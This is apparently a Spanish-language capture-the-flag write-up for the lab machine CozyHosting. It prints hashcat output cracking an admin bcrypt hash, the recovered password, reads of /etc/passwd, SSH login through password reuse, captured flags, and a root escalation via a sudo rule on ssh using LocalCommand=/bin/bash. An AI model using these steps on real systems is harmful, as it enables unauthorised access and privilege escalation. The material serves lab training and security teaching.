Speed.#1.........:      147 H/s (6.40ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2816/14344385 (0.02%)
Rejected.........: 0/2816 (0.00%)
Restore.Point....: 2752/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: bebito -> medicina
Hardware.Mon.#1..: Util: 89%

Started: Sat May  2 19:42:52 2026
Stopped: Sat May  2 19:43:48 2026

## ## Objetivo

Documentar el crackeo del hash bcrypt del usuario `admin` de la aplicación y preparar la validación de reutilización de contraseña contra usuarios locales del sistema.

## Hechos verificados

El hash extraído de la tabla `users` fue guardado en la máquina atacante en:

```text
/home/r4mon/pentest/targets/HTB/easy/CozyHosting/exploits/admin_hash.txt
```

El hash analizado fue:

```text
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

Hashcat identificó y procesó correctamente el hash usando el modo:

```text
3200 bcrypt $2*$, Blowfish (Unix)
```

El resultado fue satisfactorio:

```text
Status: Cracked
Recovered: 1/1
```

La contraseña obtenida fue:

```text
manchesterunited
```

La correspondencia final queda:

```text
usuario de aplicación: admin
hash bcrypt: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
contraseña: manchesterunited
```

## Supuestos

La contraseña `manchesterunited` pertenece al usuario `admin` de la aplicación web.

Todavía no está demostrado que exista un usuario local Linux llamado `admin`.

La vía más probable ahora no es iniciar sesión como `admin`, sino comprobar si esa contraseña ha sido reutilizada por algún usuario local real del sistema.

La comprobación debe hacerse contra usuarios presentes en `/etc/passwd`.

## Método

La cadena lógica de esta fase es:

```text
credenciales PostgreSQL en application.properties
→ acceso a base de datos cozyhosting
→ tabla users
→ hash bcrypt de admin
→ crackeo offline
→ contraseña manchesterunited
→ comprobación de reutilización contra usuarios locales
```

No debe asumirse que el usuario de aplicación y el usuario del sistema son el mismo.

Primero se identifican usuarios locales reales y después se valida si la contraseña crackeada permite acceso por SSH.

## Respuesta

El hallazgo dominante ahora es la contraseña crackeada:

```text
manchesterunited
```

El siguiente paso único es revisar usuarios locales del sistema y probar reutilización de esa contraseña por SSH contra un usuario real.

## Comandos

## En la shell como `app`

Revisar usuarios locales con shell interactiva:

```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
```

También puede revisarse de forma más amplia:

```bash
cat /etc/passwd
```

## En la máquina atacante

Si aparece el usuario local `josh`, probar acceso SSH:

```bash
ssh josh@10.129.37.233
```

Cuando pida contraseña, introducir:

```text
manchesterunited
```

## Si el acceso SSH funciona

Confirmar contexto:

```bash
whoami
id
hostname
pwd
```

Buscar la flag de usuario:

```bash
ls -la /home/josh
cat /home/josh/user.txt
```

Comprobar permisos sudo del usuario:

```bash
sudo -l
```

## Comprobaciones

Debe comprobarse si existe un usuario local llamado `josh`.

Debe comprobarse si `manchesterunited` funciona por SSH.

Debe comprobarse que el acceso SSH cae en la máquina objetivo y no en otra sesión local.

Debe comprobarse el usuario efectivo tras entrar:

```text
whoami
```

Debe comprobarse si el usuario tiene permisos sudo:

```text
sudo -l
```

## Notas para el informe

El crackeo del hash bcrypt convierte un secreto de aplicación en una credencial en claro.

La contraseña obtenida no debe asumirse automáticamente como credencial del sistema. Su valor real aparece al comprobar reutilización contra usuarios locales.

El patrón técnico de esta fase queda así:

```text
JAR de Spring Boot
→ application.properties
→ credenciales PostgreSQL
→ tabla users
→ hash bcrypt de admin
→ contraseña crackeada
→ posible reutilización SSH
```

## Siguiente paso único

Identificar usuarios locales en `/etc/passwd` y validar si `manchesterunited` permite iniciar sesión por SSH como usuario real del sistema.

## Ejecutamos:

app@cozyhosting:/app$ cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
app@cozyhosting:/app$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
app@cozyhosting:/app$

❯ ssh josh@10.129.37.233
The authenticity of host '10.129.37.233 (10.129.37.233)' can't be established.
ED25519 key fingerprint is SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.129.37.233' (ED25519) to the list of known hosts.
josh@10.129.37.233's password:
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat May  2 06:04:15 PM UTC 2026

  System load:           0.00439453125
  Usage of /:            55.4% of 5.42GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             248
  Users logged in:       0
  IPv4 address for eth0: 10.129.37.233
  IPv6 address for eth0: dead:beef::a0de:adff:fe79:9ecf


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
josh@cozyhosting:~$
josh@cozyhosting:~$ whoami
josh
josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:~$ hostname
cozyhosting
josh@cozyhosting:~$ pwd
/home/josh
josh@cozyhosting:~$ ls -la /home/josh
total 36
drwxr-x--- 3 josh josh 4096 Aug  8  2023 .
drwxr-xr-x 3 root root 4096 May 18  2023 ..
lrwxrwxrwx 1 root root    9 May 11  2023 .bash_history -> /dev/null
-rw-r--r-- 1 josh josh  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 josh josh 3771 Jan  6  2022 .bashrc
drwx------ 2 josh josh 4096 May 18  2023 .cache
-rw------- 1 josh josh   20 May 18  2023 .lesshst
-rw-r--r-- 1 josh josh  807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 May 21  2023 .psql_history -> /dev/null
-rw-r--r-- 1 josh josh   39 Aug  8  2023 .vimrc
-rw-r----- 1 root josh   33 May  2 10:52 user.txt
josh@cozyhosting:~$ cat /home/josh/user.txt
d2f307799472b53e63932cffbae92e2b
josh@cozyhosting:~$
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
josh@cozyhosting:~$

## ## Objetivo

Analizar el acceso conseguido como `josh`, registrar la captura de `user.txt` y preparar la escalada de privilegios a partir del permiso sudo observado.

## Hechos verificados

El acceso por SSH como `josh` ha funcionado correctamente usando la contraseña crackeada:

```text
manchesterunited
```

El usuario efectivo es:

```text
josh
```

El identificador del usuario es:

```text
uid=1003(josh) gid=1003(josh) groups=1003(josh)
```

El hostname sigue siendo:

```text
cozyhosting
```

El directorio actual es:

```text
/home/josh
```

La flag de usuario se ha leído correctamente:

```text
d2f307799472b53e63932cffbae92e2b
```

El permiso sudo relevante es:

```text
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

## Supuestos

El hallazgo dominante ya no está en la aplicación web ni en PostgreSQL, sino en la configuración de `sudo`.

El usuario `josh` puede ejecutar `/usr/bin/ssh` como `root` con cualquier argumento, indicado por el comodín `*`.

Ese permiso permite abusar de opciones del cliente SSH que ejecutan comandos locales después de establecer una conexión.

## Método

La cadena lógica ahora es:

```text
hash bcrypt crackeado
→ contraseña reutilizada
→ SSH como josh
→ user.txt obtenido
→ sudo -l
→ /usr/bin/ssh ejecutable como root
→ escalada mediante opciones del cliente SSH
```

El punto clave es que `ssh` no es solo un cliente de conexión remota. También admite opciones como `LocalCommand`, que permiten ejecutar un comando local tras establecer la conexión.

Como el binario `ssh` se ejecuta con `sudo`, ese comando local puede ejecutarse en contexto `root`.

## Respuesta

El hallazgo dominante es el permiso sudo:

```text
(root) /usr/bin/ssh *
```

La siguiente acción es validar la escalada usando `ssh` como root con `PermitLocalCommand` y `LocalCommand`.

## Comandos

En la sesión SSH como `josh`:

```bash
sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1
```

Cuando pida la contraseña de `josh`, usar:

```text
manchesterunited
```

Una vez aparezca la shell, validar contexto:

```bash
whoami
id
hostname
pwd
```

Leer la flag de root:

```bash
cat /root/root.txt
```

## Comprobaciones

Debe comprobarse que `whoami` devuelve:

```text
root
```

Debe comprobarse que `id` muestra:

```text
uid=0(root)
```

Debe comprobarse que la shell sigue estando en la máquina:

```text
cozyhosting
```

Debe comprobarse que `/root/root.txt` es accesible.

## Notas para el informe

La escalada no depende de un binario SUID ni de una vulnerabilidad del kernel.

La escalada depende de una configuración insegura de `sudoers`: permitir a `josh` ejecutar `/usr/bin/ssh` como `root` con argumentos arbitrarios.

El abuso se basa en que el cliente SSH permite ejecutar comandos locales mediante opciones de configuración. Al ejecutarse el cliente con `sudo`, el comando local hereda el contexto privilegiado.

Cadena final de privilegios:

```text
contraseña crackeada
→ SSH como josh
→ sudo -l
→ /usr/bin/ssh * como root
→ LocalCommand
→ shell root
```
## Ejecutamos:

josh@cozyhosting:~$ sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:x/7yQ53dizlhq7THoanU79X7U63DSQqSi39NPLqRKHM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
josh@127.0.0.1's password:
root@cozyhosting:/home/josh# whoami
root
root@cozyhosting:/home/josh# id
uid=0(root) gid=0(root) groups=0(root)
root@cozyhosting:/home/josh# hostname
cozyhosting
root@cozyhosting:/home/josh# pwd
/home/josh
root@cozyhosting:/home/josh# cat /root/root.txt
edba58633595f327570a0c2683f14201
root@cozyhosting:/home/josh#

## Conclusión

Máquina sentenciada.

Cierre: acceso inicial limpio, movimiento lateral justificado y escalada por mala configuración de `sudo`.

````md
## Escalada de privilegios - De `josh` a `root`

## Objetivo

Documentar la escalada final de privilegios en CozyHosting, partiendo del acceso SSH como `josh` y aprovechando un permiso `sudo` inseguro sobre `/usr/bin/ssh`.

## Hechos verificados

El usuario `josh` tiene acceso SSH válido en la máquina objetivo.

El contexto inicial tras entrar por SSH es:

```bash
whoami
josh

id
uid=1003(josh) gid=1003(josh) groups=1003(josh)

hostname
cozyhosting

pwd
/home/josh
````

La flag de usuario se encuentra en:

```bash
/home/josh/user.txt
```

Y su contenido es:

```text
d2f307799472b53e63932cffbae92e2b
```

La comprobación de permisos sudo muestra:

```text
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

## Lectura didáctica

El permiso sudo observado es el punto crítico de la escalada.

La línea:

```text
(root) /usr/bin/ssh *
```

significa que `josh` puede ejecutar el binario `/usr/bin/ssh` como `root` y además puede pasarle argumentos arbitrarios.

Esto es peligroso porque `ssh` no solo permite conectarse a otros hosts. También permite definir opciones de cliente que ejecutan comandos locales después de establecer la conexión.

La opción relevante es:

```text
LocalCommand
```

Pero para que `LocalCommand` se ejecute, debe habilitarse también:

```text
PermitLocalCommand=yes
```

Por tanto, si `ssh` se ejecuta mediante `sudo`, el comando definido en `LocalCommand` se ejecuta con privilegios de `root`.

## Comando de escalada

Desde la sesión como `josh`, se ejecutó:

```bash
sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1
```

La conexión se hizo contra `127.0.0.1`, es decir, contra la propia máquina.

Al ser la primera conexión SSH contra localhost, apareció la advertencia de huella del host:

```text
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
```

Se aceptó la huella escribiendo:

```text
yes
```

Después se introdujo la contraseña de `josh`.

## Resultado

Tras completarse la conexión, se abrió una shell como `root`:

```bash
whoami
root

id
uid=0(root) gid=0(root) groups=0(root)

hostname
cozyhosting

pwd
/home/josh
```

## Flag de root

La flag de root se leyó desde:

```bash
/root/root.txt
```

Contenido:

```text
edba58633595f327570a0c2683f14201
```

## Explicación técnica

La escalada no depende de una vulnerabilidad del kernel ni de un binario SUID clásico.

El problema está en la configuración de `sudoers`.

Permitir ejecutar `ssh` como `root` con argumentos libres permite abusar de funciones legítimas del propio cliente SSH.

La opción:

```text
-o PermitLocalCommand=yes
```

habilita la ejecución de comandos locales.

La opción:

```text
-o 'LocalCommand=/bin/bash'
```

define que el comando local sea una shell Bash.

Como el cliente SSH se ejecuta mediante `sudo`, esa Bash se lanza con privilegios de `root`.

## Cadena final de explotación

```text
Spring Boot Actuator expuesto
→ /actuator/sessions filtra sesión de kanderson
→ acceso al panel /admin
→ formulario /executessh
→ command injection en username
→ shell como app
→ extracción de cloudhosting-0.0.1.jar
→ application.properties expone credenciales PostgreSQL
→ tabla users contiene hash bcrypt de admin
→ hash crackeado como manchesterunited
→ contraseña reutilizada por josh
→ SSH como josh
→ sudo -l revela /usr/bin/ssh como root
→ abuso de LocalCommand
→ shell root
```

## Hallazgo dominante de la escalada

```text
Permiso sudo inseguro: josh puede ejecutar /usr/bin/ssh como root con argumentos arbitrarios.
```

## Resultado final

```text
Usuario inicial de la shell: app
Usuario lateral: josh
Usuario final: root
Host: cozyhosting
User flag: d2f307799472b53e63932cffbae92e2b
Root flag: edba58633595f327570a0c2683f14201
```

## Lección reutilizable

Cuando `sudo -l` permite ejecutar binarios complejos como `ssh`, no debe analizarse solo si el binario “abre una conexión”.

Hay que revisar sus opciones avanzadas.

En este caso, `ssh` permitió ejecutar un comando local mediante `LocalCommand`, y al ejecutarse con `sudo`, ese comando heredó privilegios de `root`.

La lección principal es:

```text
Un binario legítimo con demasiada libertad en sudoers puede convertirse en una vía directa de escalada.
```

```
```


````````````
